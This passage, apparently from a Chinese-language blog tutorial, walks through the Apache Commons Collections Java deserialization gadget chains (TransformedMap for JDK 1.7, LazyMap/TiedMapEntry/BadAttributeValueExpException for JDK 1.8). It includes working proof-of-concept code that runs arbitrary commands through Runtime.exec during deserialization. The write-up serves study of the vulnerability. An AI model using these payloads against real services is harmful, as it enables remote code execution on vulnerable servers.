<code>this.iArgs</code>我们都是可以直接输入的。而<code>input</code>是在函数调用的时候传入的，我们同样是可控的。</p><p>当我们向对应参数传入以下值，即可以调用代码执行:</p><p><img src="/2020/11/25/cong-apache-commons-collections-zhong-xue-xi-java-fan-xu-lie-hua/QQ%E6%88%AA%E5%9B%BE20201107194652.png" alt></p><p>​    <strong>存在一组可控的反射调用</strong>是cc链存在反序列化漏洞的根本原因，但是这里我们只能只能在本地服务器上执行。是无法达成我们想要远程执行命令的效果，这里主要的限制是我们没有没有办法直接传入Runtime类的实例对象。</p><p>要想真正的形成调用链，我们仍然需要利用java的反射机制来调用函数，并且至少要调用四个方法:</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">getMethod</span><span class="params">()</span>, <span class="title">getRuntime</span><span class="params">()</span>, <span class="title">exec</span><span class="params">()</span> ,<span class="title">invoke</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><p>所以我们之后找到了<code>ChainedTransformer</code> 类。</p><h5 id="org-apache-commons-collections-functors-ChainedTransformer"><a href="#org-apache-commons-collections-functors-ChainedTransformer" class="headerlink" title="org/apache/commons/collections/functors/ChainedTransformer"></a>org/apache/commons/collections/functors/ChainedTransformer</h5><p><strong>IDEA跟进53~63行</strong></p><p><img src="/2020/11/25/cong-apache-commons-collections-zhong-xue-xi-java-fan-xu-lie-hua/QQ%E6%88%AA%E5%9B%BE20201107200130.png" alt></p><p>简单的分析代码逻辑，该类的构造函数接受一个数组，我们只需要传入一个数组<code>chainedTransformer</code>就可以依次去调用每一个类的transform方法。</p><h4 id="org-apache-commons-collections-functors-ConstantTransformer"><a href="#org-apache-commons-collections-functors-ConstantTransformer" class="headerlink" title="org/apache/commons/collections/functors/ConstantTransformer"></a>org/apache/commons/collections/functors/ConstantTransformer</h4><p><img src="/2020/11/25/cong-apache-commons-collections-zhong-xue-xi-java-fan-xu-lie-hua/QQ%E6%88%AA%E5%9B%BE20201107212925.png" alt></p><p>接口函数，在上面的循环中进入了不同的函数。给一个初始的object，然后输出作为下一个输入，从而实现链式调用。</p><p><strong>最后的反射poc如下:</strong></p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="type">Transformer</span>[] &#123;</span><br><span class="line">            <span class="comment">//传入Runtime类</span></span><br><span class="line">            <span class="keyword">new</span> <span class="type">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="comment">//反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法</span></span><br><span class="line">            <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">"getMethod"</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="type">Class</span>[] &#123;<span class="keyword">String</span>.class, Class[].<span class="class"><span class="keyword">class</span> &#125;,</span></span><br><span class="line"><span class="class">                    <span class="title">new</span> <span class="title">Object</span>[] </span>&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> <span class="type">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="comment">//反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象</span></span><br><span class="line">            <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">"invoke"</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="type">Class</span>[] &#123;Object.class, Object[].<span class="class"><span class="keyword">class</span> &#125;,</span></span><br><span class="line"><span class="class">                    <span class="title">new</span> <span class="title">Object</span>[] </span>&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="type">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="comment">//反射调用exec方法</span></span><br><span class="line">            <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">"exec"</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="type">Class</span>[] &#123;<span class="keyword">String</span>.<span class="class"><span class="keyword">class</span> &#125;,</span></span><br><span class="line"><span class="class">                    <span class="title">new</span> <span class="title">Object</span>[] </span>&#123;<span class="string">"open -a Calculator"</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> <span class="type">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>我们已经构造好了恶意的反射链条，现在我们的目标是触发该类的transform方法。</p><h4 id="二、寻找触发链"><a href="#二、寻找触发链" class="headerlink" title="二、寻找触发链"></a>二、寻找触发链</h4><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">某个类的readObject方法</span><br><span class="line">-&gt;一系列调用</span><br><span class="line">-&gt;Transformerchain的transformer方法</span><br><span class="line">-&gt;执行反射链</span><br><span class="line">-&gt;执行Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"calc"</span>&#125;)</span><br></pre></td></tr></table></figure><ul><li>找到一个 <code>tansform()</code> 方法 , 该方法所属的实例对象是可控的</li><li>找到一个重写的 <code>readObject()</code> 方法 , 该方法会自动调用 <code>transform()</code> 方法.</li></ul><h4 id="JDK1-7–TransformedMap利用链"><a href="#JDK1-7–TransformedMap利用链" class="headerlink" title="JDK1.7–TransformedMap利用链"></a>JDK1.7–TransformedMap利用链</h4><p>​    <strong>Transmap类</strong>在一个元素被添加/删除/或是被修改时，会调用transform方法。我们可以通过TransformedMap.decorate()方法获得一个TransformedMap的实例。</p><p>​     因此，我们可以先构造一个TransformeMap实例,然后修改其中的数据，然后使其自动调用我们之前设定好的transform()方法。</p><h5 id="调用链"><a href="#调用链" class="headerlink" title="调用链:"></a>调用链:</h5><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-&gt;ObjectInputStream.readObject()</span><br><span class="line">-&gt;AnnotationInvocationHandler.readObject()</span><br><span class="line">-&gt;TransformedMap.entrySet().iterator().next().setValue()</span><br><span class="line">-&gt;TransformedMap.checkSetValue()</span><br><span class="line"><span class="function"> -&gt;</span>TransformedMap.transform()</span><br><span class="line">-&gt;ChainedTransformer.transform()</span><br></pre></td></tr></table></figure><h5 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h5><p>首先看<code>/org/apache/commons/collections/map/TransformedMap</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map <span class="built_in">map</span>, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        super(<span class="built_in">map</span>);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> <code>TransformedMap</code>中的<code>valueTransformer</code>在初始化时我们是可控的.</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">Object</span> put(<span class="keyword">Object</span> <span class="built_in">key</span>, <span class="keyword">Object</span> value) &#123;</span><br><span class="line">        <span class="built_in">key</span> = <span class="keyword">this</span>.transformKey(<span class="built_in">key</span>);</span><br><span class="line">        value = <span class="keyword">this</span>.transformValue(value);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getMap().put(<span class="built_in">key</span>, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当执行put方法时会进入<code>transformValue</code>方法:</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object transformValue(Object <span class="keyword">object</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer == <span class="literal">null</span> ? <span class="keyword">object</span> : <span class="keyword">this</span>.valueTransformer.transform(<span class="keyword">object</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们可以控制这里的<code>valueTransformer</code>值为ChianedTransformer即可触发利用链。</p><p><strong>但是目前的构造仍然需要Map中的某一项去调用setValue(),我们如果想要在反序列化调用readObject()时直接触发呢?</strong></p><h5 id="AbstractInputCheckedMapDecorator类"><a href="#AbstractInputCheckedMapDecorator类" class="headerlink" title="AbstractInputCheckedMapDecorator类"></a>AbstractInputCheckedMapDecorator类</h5><p>​    调用java自带类<code>AnnotationInvocationHandler</code>中重写的readObject方法，该方法调用时会先将map转为Map.entry,然后执行setvalue操作。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var5</span><span class="selector-class">.setValue</span>((<span class="selector-tag">new</span> <span class="selector-tag">AnnotationTypeMismatchExceptionProxy</span>(<span class="selector-tag">var8</span><span class="selector-class">.getClass</span>() + "<span class="selector-attr">[<span class="string">" + var8 + "</span>]</span>"))<span class="selector-class">.setMember</span>((<span class="selector-tag">Method</span>)<span class="selector-tag">var2</span><span class="selector-class">.members</span>()<span class="selector-class">.get</span>(<span class="selector-tag">var6</span>)));</span><br></pre></td></tr></table></figure><p>TransformedMap利用Map.Entry取得第一个值，调用修改值的函数，会触发的setValue()代码</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span>(<span class="params">Object <span class="keyword">value</span></span>)</span> &#123;</span><br><span class="line">            <span class="keyword">value</span> = <span class="keyword">this</span>.parent.checkSetValue(<span class="keyword">value</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.entry.setValue(<span class="keyword">value</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>接着到了TransoformedMap的checkSetValue()方法。</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span>(<span class="params">Object <span class="keyword">value</span></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer.transform(<span class="keyword">value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    这里的valueTransformer.transform实际上就是ChianedTransformer类的transform方法。就会触发刚刚我们构造的反射链。</p><h5 id="最后的POC："><a href="#最后的POC：" class="headerlink" title="最后的POC："></a>最后的POC：</h5><p>这里直接上其他大师傅们的poc:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">package Serialize2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> ApacheSerialize2 implements <span class="keyword">Serializable</span> &#123;</span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span> main(String[] args) throws <span class="keyword">Exception</span>&#123;</span><br><span class="line">         Transformer[] transformers = <span class="built_in">new</span> Transformer[]&#123;</span><br><span class="line">                 <span class="built_in">new</span> ConstantTransformer(Runtime.<span class="keyword">class</span>),</span><br><span class="line">                 <span class="built_in">new</span> InvokerTransformer("getMethod", <span class="built_in">new</span> <span class="keyword">Class</span>[]&#123;String.<span class="keyword">class</span>, <span class="keyword">Class</span>[].<span class="keyword">class</span>&#125;, <span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;"getRuntime", <span class="built_in">new</span> <span class="keyword">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                 <span class="built_in">new</span> InvokerTransformer("invoke", <span class="built_in">new</span> <span class="keyword">Class</span>[]&#123;<span class="keyword">Object</span>.<span class="keyword">class</span>, <span class="keyword">Object</span>[].<span class="keyword">class</span>&#125;, <span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;<span class="keyword">null</span>, <span class="built_in">new</span> <span class="keyword">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                 <span class="built_in">new</span> InvokerTransformer("exec", <span class="built_in">new</span> <span class="keyword">Class</span>[]&#123;String.<span class="keyword">class</span>&#125;, <span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;"calc.exe"&#125;)</span><br><span class="line">         &#125;;</span><br><span class="line">         Transformer transformerChain = <span class="built_in">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">         Map map = <span class="built_in">new</span> HashMap();</span><br><span class="line">         map.put("value", "sijidou");</span><br><span class="line">         Map transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">Class</span> cl = <span class="keyword">Class</span>.forName("sun.reflect.annotation.AnnotationInvocationHandler");</span><br><span class="line">         Constructor ctor = cl.getDeclaredConstructor(<span class="keyword">Class</span>.<span class="keyword">class</span>, Map.<span class="keyword">class</span>);</span><br><span class="line">         ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         <span class="keyword">Object</span> instance = ctor.newInstance(Target.<span class="keyword">class</span>, transformedMap);</span><br><span class="line"></span><br><span class="line">         //序列化</span><br><span class="line">         FileOutputStream fileOutputStream = <span class="built_in">new</span> FileOutputStream("serialize3.txt");</span><br><span class="line">         ObjectOutputStream objectOutputStream = <span class="built_in">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line">         objectOutputStream.writeObject(instance);</span><br><span class="line">         objectOutputStream.<span class="keyword">close</span>();</span><br><span class="line"></span><br><span class="line">         //反序列化</span><br><span class="line">         FileInputStream fileInputStream = <span class="built_in">new</span> FileInputStream("serialize3.txt");</span><br><span class="line">         ObjectInputStream objectInputStream = <span class="built_in">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line">         <span class="keyword">Object</span> result = objectInputStream.readObject();</span><br><span class="line">         objectInputStream.<span class="keyword">close</span>();</span><br><span class="line">         <span class="keyword">System</span>.<span class="keyword">out</span>.println(result);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/11/25/cong-apache-commons-collections-zhong-xue-xi-java-fan-xu-lie-hua/QQ%E6%88%AA%E5%9B%BE20201108122458.png" alt></p><h4 id="JDK1-8–LazyMap利用链"><a href="#JDK1-8–LazyMap利用链" class="headerlink" title="JDK1.8–LazyMap利用链"></a>JDK1.8–LazyMap利用链</h4><p>​    对于JDK 1.8来说，<code>AnnotationInvocationHandler</code>类中关键的触发点，setvalue发生了改变。所以我们需要寻找新的类重写readObject来实现调用，</p><h5 id="调用链-1"><a href="#调用链-1" class="headerlink" title="调用链"></a>调用链</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">反序列化BadAttributeValueExpException</span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">BadAttributeValueExpException</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">TideMapEntry</span>.</span></span><span class="keyword">to</span><span class="constructor">String()</span></span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">TideMapEntry</span>.</span></span>get<span class="constructor">Value()</span></span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">LazyMap</span>.</span></span>get<span class="literal">()</span></span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">ChainedTransformer</span>.</span></span>transform<span class="literal">()</span></span><br></pre></td></tr></table></figure><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>我们首先看一下LazyMap这个类,这个类也实现了一个map接口:</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> LazyMap(Map <span class="built_in">map</span>, Transformer factory)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">super</span>(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Factory must not be null"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>.factory = factory;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">Object</span> <span class="built_in">get</span>(<span class="keyword">Object</span> <span class="built_in">key</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">this</span>.<span class="built_in">map</span>.containsKey(<span class="built_in">key</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">Object</span> value = <span class="keyword">this</span>.factory.transform(<span class="built_in">key</span>); </span><br><span class="line">    <span class="keyword">this</span>.<span class="built_in">map</span>.put(<span class="built_in">key</span>, value);</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.<span class="built_in">map</span>.<span class="built_in">get</span>(<span class="built_in">key</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        我们可以看到<strong>get方法</strong>中如果没有找到key的键值，就会调用<code>factory.transform(key);</code>,这里的factory变量属于Transformer接口类并且具体使用哪一个类来实例化对象是我们可控的。也就可以形成调用链。</p><p>那么如何去自动调用get()方法,跟进<code>TiedMapEntry</code>类</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> TiedMapEntry(Map <span class="built_in">map</span>, <span class="keyword">Object</span> <span class="built_in">key</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">this</span>.<span class="built_in">map</span> = <span class="built_in">map</span>;</span><br><span class="line">  <span class="keyword">this</span>.<span class="built_in">key</span> = <span class="built_in">key</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//toString方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">String</span> toString()</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">return</span> getKey() + <span class="string">"="</span> + getValue();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//getKey方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">Object</span> getValue()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.<span class="built_in">map</span>.<span class="built_in">get</span>(<span class="keyword">this</span>.<span class="built_in">key</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>TiedMapEntry</code>中，构造时传入使用<code>LazyMap</code>，调用<code>tostring()</code>方法，然后紧接着就会调用LazyMap类对象的get方法。</p><p>​    那么到目前为止，我们仍然需要一个类可以在反序列化重写readObject()时可以自动调用toString方法。完整的利用链就可以形成。</p><h5 id="BadAttributeValueExpException类"><a href="#BadAttributeValueExpException类" class="headerlink" title="BadAttributeValueExpException类"></a>BadAttributeValueExpException类</h5><p>看到<code>BadAttributeValueExpException</code>的<code>readObject</code>反序列化方法，调用了<code>toString</code>方法。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> readObject(ObjectInputStream ois) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">    Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">        val = <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Long</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Float</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Double</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Byte</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Short</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Boolean</span>) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">"@"</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    其中 <code>valObj</code> 为构造的 <code>TiedMapEntry</code> 类的对象，可以看到其中调用了该类的 <code>toString</code> 函数。</p><p>​    所以，我们只要构造一个<code>BadAttributeValueExpException</code>对象，并注入我们精心制造的<code>TiedMapEntry</code>对象。就可在以在反序列时，执行任意命令。</p><h5 id="最后的POC"><a href="#最后的POC" class="headerlink" title="最后的POC"></a>最后的POC</h5><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> Exec  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> BadAttributeValueExpException getObject(<span class="keyword">final</span> String command) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line">        <span class="comment">// inert chain for setup</span></span><br><span class="line">        <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">                <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">        <span class="comment">// real chain for after setup</span></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="keyword">Runtime</span>.<span class="keyword">class</span>),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> <span class="keyword">Class</span>[] &#123;</span><br><span class="line">                        String.<span class="keyword">class</span>, <span class="keyword">Class</span>[].<span class="keyword">class</span> &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">"getRuntime"</span>, <span class="keyword">new</span> <span class="keyword">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> <span class="keyword">Class</span>[] &#123;</span><br><span class="line">                        Object.<span class="keyword">class</span>, Object[].<span class="keyword">class</span> &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="keyword">Class</span>[] &#123; String.<span class="keyword">class</span> &#125;, execArgs),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field valfield = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span 